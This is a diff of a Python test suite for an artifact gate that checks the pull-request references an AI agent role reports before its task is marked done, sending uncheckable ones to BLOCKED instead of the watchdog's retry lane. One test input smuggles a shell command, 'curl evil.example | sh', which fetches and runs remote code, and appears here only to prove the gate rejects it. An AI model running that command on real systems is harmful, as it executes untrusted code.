@@ -386,27 +386,29 @@ def test_eng_spec_section_on_ordered_spec_dispatch_may_done(writes, spawn):
     "body,why",
     [
         ("https://evil.example/o/r/pull/1", "foreign host"),
-        ("https://github.com/other/repo/pull/1", "cross-repo vs dispatch_repo"),
         ("PR #1; curl evil.example | sh", "shell metacharacters"),
-        ("#42", "bare #N with no dispatch_repo to anchor it"),
     ],
 )
 def test_invalid_ref_shape_never_done(writes, spawn, monkeypatch, body, why):
-    """Rejected on shape before the resolver — never handed an unvetted ref."""
+    """Rejected on shape before the resolver — never handed an unvetted ref.
+
+    FAILED (the watchdog re-runs it): the agent got the reference wrong. The
+    reason shows the ref it offered and the repo the task expected.
+    """
     resolves: list[tuple] = []
     monkeypatch.setattr(
         apis, "resolve_artifact_ref", lambda *a, **k: resolves.append((a, k)) or True
     )
     spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
-    snapshot = _cicada_task()
-    if body == "#42":
-        snapshot.pop("repo")
-    _dispatch("ent_invalid_1", snapshot)
+    _dispatch("ent_invalid_1", _cicada_task())
 
     assert resolves == [], f"handed the resolver a rejected ref ({why})"
     _assert_not_done(writes, f"accepted an invalid ref ({why})")
     failed = _with_status(writes, "failed")
     assert failed and "[ARTIFACT_GATE] invalid_ref_shape" in failed[-1].get("reason", "")
+    reason = failed[-1]["reason"]
+    assert 'offered="' in reason and f"expected_repo={_REPO}" in reason
+    assert "re-runs it automatically" in reason, "did not say the watchdog retries"
 
 
 def test_stderr_fallback_accepts_header(writes, spawn, monkeypatch):
@@ -694,10 +696,19 @@ def test_foreign_pr_url_with_no_repo_on_the_task_is_never_done(
 
     assert resolves == [], "handed the resolver a URL there was no repo to check against"
     _assert_not_done(writes, "accepted a PR URL for a repo the task never named")
-    failed = _with_status(writes, "failed")
-    assert failed and "[ARTIFACT_GATE] invalid_ref_shape" in failed[-1]["reason"]
-    assert "dispatch_repo" in failed[-1]["reason"]
-    assert notifier.sent
+    # No repo on the task: the ref cannot be checked, so it is neither accepted
+    # nor judged wrong. BLOCKED (nothing retries it), not FAILED, so a real PR the
+    # agent opened is not re-run into a second one.
+    assert not _with_status(writes, "failed"), "sent an uncheckable ref to the retry lane"
+    blocked = _with_status(writes, "blocked")
+    assert blocked and "[ARTIFACT_GATE] ref_unverifiable" in blocked[-1]["reason"]
+    reason = blocked[-1]["reason"]
+    assert "https://github.com/other-org/other-repo/pull/7" in reason, "offered ref missing"
+    assert "expected_repo=none recorded on the task" in reason
+    assert "no repo to check it against" in reason
+    assert "NOT retried automatically" in reason and "Do not re-dispatch" in reason
+    assert "neotoma corrections create --entity-id ent_foreign_1" in reason
+    assert notifier.sent and "NOT retried" in notifier.sent[-1]
 
 
 def test_pr_url_for_the_tasks_own_repo_is_still_done(writes, spawn, monkeypatch):
@@ -767,9 +778,11 @@ def test_abbreviated_sha_is_refused_even_with_a_repo(writes, spawn, monkeypatch)
     spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: a1b2c3d\n")
     _dispatch("ent_short_sha_1", _cicada_task())
     assert resolves == []
-    failed = _with_status(writes, "failed")
-    assert failed and "invalid_ref_shape" in failed[-1]["reason"]
-    assert "40-character" in failed[-1]["reason"]
+    # A real commit may exist behind the prefix: BLOCKED, not retried.
+    assert not _with_status(writes, "failed")
+    blocked = _with_status(writes, "blocked")
+    assert blocked and "ref_unverifiable" in blocked[-1]["reason"]
+    assert "40-character" in blocked[-1]["reason"] and 'offered="a1b2c3d"' in blocked[-1]["reason"]
 
 
 def test_full_sha_with_a_repo_is_done(writes, spawn, monkeypatch):
@@ -817,3 +830,313 @@ def test_secrets_in_the_header_and_blocked_body_are_redacted(
     _dispatch("ent_redact_2", _cicada_task())
     blocked = _with_status(writes, "blocked")
     assert blocked and fake_value not in blocked[-1]["reason"], "leaked into BLOCKED reason"
+
+
+# ── Round-3 review findings (arch, ux) ───────────────────────────────────────
+#
+# What these looked like RED (each against the code before its fix):
+#
+#     test_gh_rate_limit_is_blocked_not_failed
+#         AssertionError: a gh rate limit was written FAILED, which the stall
+#         watchdog re-runs: [{'status': <TaskStatus.FAILED>, 'reason':
+#         '[ARTIFACT_GATE] unresolvable_ref role=cicada ...'}]
+#
+#     test_prose_role_record_not_saved_does_not_talk_about_a_pr
+#         AssertionError: prose deliverable told 'The PR exists ... would open a
+#         second PR'
+#
+#     test_stale_readback_never_overwrites_a_done_task
+#         AssertionError: wrote BLOCKED over a task that is DONE with the result
+
+
+import subprocess  # noqa: E402
+
+
+def _fake_gh(monkeypatch, *, returncode=1, stderr="", raises=None):
+    """Stand in for the `gh` subprocess `resolve_artifact_ref` really runs."""
+    calls: list[list[str]] = []
+
+    def run(cmd, **kw):
+        calls.append(cmd)
+        if raises is not None:
+            raise raises
+        return subprocess.CompletedProcess(cmd, returncode, stdout="", stderr=stderr)
+
+    monkeypatch.setattr(subprocess, "run", run)
+    return calls
+
+
+@pytest.mark.parametrize(
+    "gh",
+    [
+        dict(returncode=1, stderr="gh: API rate limit exceeded for user ID 1. (HTTP 403)"),
+        dict(returncode=1, stderr="gh: Server Error (HTTP 503)"),
+        dict(returncode=1, stderr="gh: Bad credentials (HTTP 401)"),
+        dict(returncode=1, stderr=""),
+        dict(raises=subprocess.TimeoutExpired(cmd="gh", timeout=30)),
+        dict(raises=FileNotFoundError("gh not installed")),
+    ],
+    ids=["rate-limit", "5xx", "auth", "unknown-nonzero", "timeout", "oserror"],
+)
+def test_gh_rate_limit_is_blocked_not_failed(writes, spawn, monkeypatch, gh):
+    """arch: "could not check" is not "does not exist".
+
+    FAILED is the watchdog's automatic re-run lane. A real PR the agent named
+    must not be re-run into a second one because gh hiccupped.
+    """
+    calls = _fake_gh(monkeypatch, **gh)
+    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
+    notifier = _Notifier()
+    _dispatch("ent_gh_1", _cicada_task(), notifier=notifier)
+
+    assert calls, "the real resolver never ran"
+    _assert_not_done(writes, "completed although GitHub could not be asked")
+    assert not _with_status(writes, "failed"), "sent an uncheckable ref to the retry lane"
+    blocked = _with_status(writes, "blocked")
+    assert blocked, writes
+    reason = blocked[-1]["reason"]
+    assert "[ARTIFACT_GATE] ref_check_unavailable" in reason
+    assert f"offered=\"{_REPO}#999\"" in reason, "the ref must be in the reason"
+    assert "NOT retried automatically" in reason and "Do not re-dispatch" in reason
+    assert notifier.sent and "NOT retried" in notifier.sent[-1] and "HELD" in notifier.sent[-1]
+
+
+@pytest.mark.parametrize(
+    "stderr",
+    [
+        "GraphQL: Could not resolve to a PullRequest with the number of 999. (repository.pullRequest)",
+        "gh: Not Found (HTTP 404)",
+    ],
+)
+def test_definitive_not_found_is_failed(writes, spawn, monkeypatch, stderr):
+    _fake_gh(monkeypatch, returncode=1, stderr=stderr)
+    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
+    _dispatch("ent_gh_2", _cicada_task())
+    _assert_not_done(writes, "accepted a PR GitHub says does not exist")
+    failed = _with_status(writes, "failed")
+    assert failed and "[ARTIFACT_GATE] unresolvable_ref" in failed[-1]["reason"]
+    assert "re-runs it automatically" in failed[-1]["reason"]
+    assert not _with_status(writes, "blocked")
+
+
+def test_gh_success_with_the_real_resolver_is_done(writes, spawn, monkeypatch):
+    calls = _fake_gh(monkeypatch, returncode=0)
+    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
+    _dispatch("ent_gh_3", _cicada_task())
+    assert [w for w in writes if w.get("fn") == "complete_task_with_result"]
+    assert calls[0][:3] == ["gh", "pr", "view"] and "--repo" in calls[0]
+
+
+def test_resolver_returns_the_tri_state_strings(monkeypatch):
+    from lib.daemon_runtime.artifact_contract import ParsedRef
+
+    ref = ParsedRef(kind="pr", owner="o", repo="r", number=1, canonical="o/r#1")
+    _fake_gh(monkeypatch, returncode=0)
+    assert apis.resolve_artifact_ref(ref) == "exists"
+    _fake_gh(monkeypatch, returncode=1, stderr="Could not resolve to a PullRequest")
+    assert apis.resolve_artifact_ref(ref) == "absent"
+    _fake_gh(monkeypatch, returncode=1, stderr="API rate limit exceeded (HTTP 403)")
+    assert apis.resolve_artifact_ref(ref) == "unavailable"
+    _fake_gh(monkeypatch, raises=subprocess.TimeoutExpired(cmd="gh", timeout=1))
+    assert apis.resolve_artifact_ref(ref) == "unavailable"
+    _fake_gh(monkeypatch, raises=OSError("boom"))
+    assert apis.resolve_artifact_ref(ref) == "unavailable"
+    assert apis._normalize_ref_check(True) == "exists"
+    assert apis._normalize_ref_check(False) == "absent"
+    assert apis._normalize_ref_check("garbage") == "unavailable"
+
+
+def test_uncheckable_ref_never_reaches_the_resolver_or_the_retry_lane(
+    writes, spawn, monkeypatch
+):
+    """A task with no repo and a bare #N: BLOCKED, resolver never called."""
+    resolves: list = []
+    monkeypatch.setattr(
+        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append(a) or "exists"
+    )
+    spawn.result = _SpawnResult(stdout="[cicada] pull_request_link: #42\n")
+    snapshot = _cicada_task()
+    snapshot.pop("repo")
+    _dispatch("ent_norepo_1", snapshot)
+    assert resolves == []
+    assert not _with_status(writes, "failed")
+    blocked = _with_status(writes, "blocked")
+    assert blocked and "ref_unverifiable" in blocked[-1]["reason"]
+    assert 'offered="#42"' in blocked[-1]["reason"]
+
+
+def test_prose_role_record_not_saved_does_not_talk_about_a_pr(
+    entity, status_writes, spawn, job, monkeypatch
+):
+    """ux: `record_not_saved` fires for all gated roles; the PR wording is false for prose."""
+    ent = entity(drop={"result"})
+    monkeypatch.setattr(apis, "_resolve_skill", lambda *a, **k: "regulus")
+    monkeypatch.setattr(apis, "_resolve_role", lambda *a, **k: "regulus")
+    long_note = "reworded the install section " * 12
+    line = f"[regulus] docs_diff_or_no_change_note: {long_note.strip()}"
+    spawn.result = _SpawnResult(stdout=line + "\n", skill="regulus")
+    notifier = _Notifier()
+    _dispatch("ent_prose_rns_1", _cicada_task(), notifier=notifier)
+
+    blocked = _with_status(status_writes, "blocked")
+    assert blocked, status_writes
+    reason = blocked[-1]["reason"]
+    assert "record_not_saved" in reason
+    assert "PR" not in reason.split("Next:")[0].split("—", 1)[1], reason
+    assert "second PR" not in reason and "The PR exists" not in reason
+    assert "redo the work" in reason and "Do not re-dispatch" in reason
+    assert "--corrected-value '" in reason and "<the PR" not in reason
+    assert ent.fields["status"] != "done"
+    assert "did NOT save" in notifier.sent[-1]
+    # Named for what happened, not as an artifact-gate refusal.
+    assert job.failed_events and "task record not saved" in job.failed_events[-1][0]
+    assert "artifact gate" not in job.failed_events[-1][0]
+    # The ref/identity is cut on a word boundary, not mid-word.
+    ref = reason.split("ref=", 1)[1].split(" failed_at=", 1)[0]
+    assert ref.endswith("…") and not ref[:-1].endswith(("sect", "instal")), ref
+    assert ref[:-1].split()[-1] in {"reworded", "the", "install", "section"}, ref
+
+
+def test_pr_role_record_not_saved_keeps_the_pr_wording(
+    entity, status_writes, stages, spawn, monkeypatch
+):
+    entity(drop={"status"})
+    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
+    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
+    _dispatch("ent_pr_rns_1", _cicada_task())
+    reason = _with_status(status_writes, "blocked")[-1]["reason"]
+    assert "The PR exists" in reason and "second PR" in reason
+    assert f"--corrected-value '{_REPO}#999'" in reason
+
+
+class _StaleEntity(_TaskEntity):
+    """The first `stale_reads` snapshot reads return an old copy (stale read-back)."""
+
+    def __init__(self, *, stale_reads, preset=None, **kw):
+        super().__init__(**kw)
+        self.stale_reads = stale_reads
+        self.stale = {"status": "executing", "result": ""}
+        if preset:
+            self.fields.update(preset)
+
+    def snapshot(self, _entity_id):
+        if self.stale_reads > 0:
+            self.stale_reads -= 1
+            return dict(self.stale)
+        return dict(self.fields)
+
+
+def _use(monkeypatch, ent):
+    monkeypatch.setattr(tl, "NEOTOMA_BEARER_TOKEN", "test-token")
+    monkeypatch.setattr(tl.httpx, "post", ent.post)
+    monkeypatch.setattr(apis, "fetch_task_snapshot", ent.snapshot)
+
+
+def test_stale_readback_of_a_done_task_is_treated_as_saved(
+    status_writes, stages, spawn, job, monkeypatch
+):
+    """One more read before BLOCKED: a stale read-back must not block a DONE task."""
+    ent = _StaleEntity(stale_reads=1, preset={"status": "done", "result": _PR_HEADER})
+    _use(monkeypatch, ent)
+    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
+    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
+    _dispatch("ent_stale_1", _cicada_task())
+    assert not _with_status(status_writes, "blocked"), "blocked a task that is DONE"
+    assert len(job.finished_events) == 1 and "done" in stages
+
+
+def test_stale_readback_never_overwrites_a_done_task(
+    status_writes, spawn, job, monkeypatch
+):
+    """A task that is DONE with a DIFFERENT result is never overwritten by BLOCKED."""
+    ent = _StaleEntity(
+        stale_reads=0, drop={"result", "status"},
+        preset={"status": "done", "result": "someone else's result"},
+    )
+    _use(monkeypatch, ent)
+    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
+    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
+    notifier = _Notifier()
+    _dispatch("ent_stale_2", _cicada_task(), notifier=notifier)
+    assert not [w for w in status_writes if _status_of(w) in {"blocked", "failed"}], (
+        "wrote a status over a DONE task"
+    )
+    assert notifier.sent and "already DONE with a different result" in notifier.sent[-1]
+    assert not job.finished_events and job.failed_events
+
+
+def test_gate_status_keys_carry_the_attempt_not_just_the_trigger(writes, spawn, monkeypatch):
+    """The watchdog re-dispatches with a constant trigger; attempts 2 and 3 must
+    not replay attempt 1's idempotency key."""
+    spawn.result = _SpawnResult(stdout="no header\n")
+    suffixes = []
+    for attempt in (1, 2, 3):
+        writes.clear()
+        _dispatch(
+            f"ent_key_{attempt}", _cicada_task(attempt=attempt), trigger="watchdog_retry"
+        )
+        suffixes.append(_with_status(writes, "failed")[-1]["key_suffix"])
+    assert suffixes == ["watchdog_retry-1", "watchdog_retry-2", "watchdog_retry-3"]
+
+
+def test_completion_key_carries_the_attempt(writes, spawn, monkeypatch):
+    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: True)
+    spawn.result = _SpawnResult(stdout=f"{_PR_HEADER}\n")
+    _dispatch("ent_key_c", _cicada_task(attempt=2), trigger="watchdog_retry")
+    done = [w for w in writes if w.get("fn") == "complete_task_with_result"]
+    assert done and done[-1]["key_suffix"] == "watchdog_retry-2"
+
+
+def test_cross_repo_pr_url_is_blocked_not_retried(writes, spawn, monkeypatch):
+    """A real PR in the WRONG repo exists; a retry would open another one."""
+    resolves: list = []
+    monkeypatch.setattr(
+        apis, "resolve_artifact_ref", lambda *a, **k: resolves.append(a) or "exists"
+    )
+    spawn.result = _SpawnResult(
+        stdout="[cicada] pull_request_link: https://github.com/other/repo/pull/1\n"
+    )
+    _dispatch("ent_cross_1", _cicada_task())
+    assert resolves == []
+    assert not _with_status(writes, "failed")
+    blocked = _with_status(writes, "blocked")
+    assert blocked and "ref_unverifiable" in blocked[-1]["reason"]
+    assert "cross-repo" in blocked[-1]["reason"]
+    assert f"expected_repo={_REPO}" in blocked[-1]["reason"]
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "https://github.com/some-org/some-repo/pull/7",
+        "#42",
+        "PR #42",
+        "ab" * 20,
+        "a1b2c3d",
+        "https://github.com/other/repo/pull/1",
+    ],
+)
+def test_task_with_no_known_repo_is_never_left_failed(writes, spawn, monkeypatch, body):
+    """qa: about two thirds of prod Cicada tasks carry no repo field.
+
+    Before the gate they went DONE. A real PR URL, bare #N, or full SHA on such
+    a task cannot be checked, and FAILED is the watchdog's automatic re-run lane
+    (a second PR). Every one of them is BLOCKED, with the offered ref in the
+    reason and the "PR exists; do not re-dispatch" instruction.
+    """
+    monkeypatch.setattr(apis, "resolve_artifact_ref", lambda *a, **k: "exists")
+    spawn.result = _SpawnResult(stdout=f"[cicada] pull_request_link: {body}\n")
+    snapshot = _cicada_task()
+    snapshot.pop("repo")
+    notifier = _Notifier()
+    _dispatch("ent_norepo_any", snapshot, notifier=notifier)
+
+    _assert_not_done(writes, f"completed an uncheckable ref {body!r}")
+    assert not _with_status(writes, "failed"), f"{body!r} left in the watchdog retry lane"
+    blocked = _with_status(writes, "blocked")
+    assert blocked, writes
+    reason = blocked[-1]["reason"]
+    assert "ref_unverifiable" in reason and f'offered="{body}"' in reason
+    assert "expected_repo=none recorded on the task" in reason
+    assert "may already exist" in reason and "Do not re-dispatch" in reason
+    assert notifier.sent and "NOT retried" in notifier.sent[-1]
